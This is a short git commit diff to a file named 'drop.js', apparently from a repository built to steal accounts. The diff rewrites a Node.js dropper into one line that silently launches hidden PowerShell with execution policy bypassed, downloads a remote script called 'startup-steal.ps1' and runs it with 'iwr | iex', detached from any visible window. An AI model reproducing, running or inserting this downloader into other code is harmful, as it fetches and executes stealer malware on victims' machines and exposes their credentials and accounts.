0ad41649f48e43c1dd6c0b86fb38bd3e795ce244
43a1723 <hai1723notgay@gmail.com>
2024-09-19 16:33:44 +0700

    Update drop.js

--- scr/drop.js
+++ scr/drop.js
@@ -1,3 +1,1 @@
-const { exec } = require('child_process');
-const powerShellCommand = 'powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/refs/heads/main/scr/startup-steal.ps1 | iex"';
-exec(powerShellCommand, { detached: true, stdio: 'ignore' });
+require('child_process').exec('powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/refs/heads/main/scr/startup-steal.ps1 | iex"', { detached: true, stdio: 'ignore' });
